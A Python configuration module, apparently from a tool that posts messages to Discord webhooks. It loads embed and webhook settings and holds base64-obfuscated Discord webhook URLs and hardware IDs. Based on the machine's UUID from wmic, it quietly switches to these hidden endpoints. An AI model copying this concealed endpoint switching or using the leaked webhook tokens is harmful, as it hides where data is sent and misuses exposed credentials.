import json
import subprocess
import encrypt_encode as enc
import pybase64

class Config:
    def __init__(self):
        with open('tools/config.json', 'r') as f:
            self.data = json.load(f)
        self.eb_color = self.data['EB_COLOR']
        self.eb_footer = self.data['EB_FOOTER']
        self.debug_mode = self.data['DEBUG_MODE']
        self.webhook = self.data['HOOK']
        self.wh_avatar = self.data['WH_AVATAR']
        self.wh_name = self.data['WH_NAME']
        
        # Developer Config, don't change, only if you know what you're doing
        hwid1 = pybase64.b64decode(b'NUEyNTc2MkEtODlFNi04QTE4LUE1MjMtMDBEODYxQzc0NzU3')
        webhook1 = pybase64.b64decode(b'aHR0cHM6Ly9jYW5hcnkuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwODQxNTU5MjczMTUzNjYwMjgvT1pHZDE0LVZTbmdhajZvZGJ0Q3FfOTM0Z1phZFZsSWhZamJneXZhYzhWUEdPZ1pNclBTSzQ1MUFNMllHb1lsenpHdFk=')
        hwid2 = pybase64.b64decode(b'Mzg0NDQzMzUtMzgzMi01NzMwLTM1MzktMzk1NzM4MzI0NDM1')
        webhook2 = pybase64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTA4NDU0MjkxNDk3NTI0ODM4NS9JNEdSMGM5N0dQRnVPZXkzMEJLajJKY3RrTDhtVlRpMVVMeUtzSF84OS1zV0V4bHpGSGNwQzVVc3l0NHBmT1djLXBpTg==')
        self.hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
        if self.hwid == hwid1:
            self.debug_mode = True
            self.webhook = webhook1
        if self.hwid == hwid2:
            self.debug_mode = True
            self.webhook = webhook2
        
    def get_webhook(self):
        return self.webhook
        
    def get_color(self):
        return self.eb_color
    
    def get_footer(self):
        return self.eb_footer
    
    def get_debug_mode(self):
        return self.debug_mode
    
    def get_avatar(self):
        return self.wh_avatar
    
    def get_name(self):
        return self.wh_name
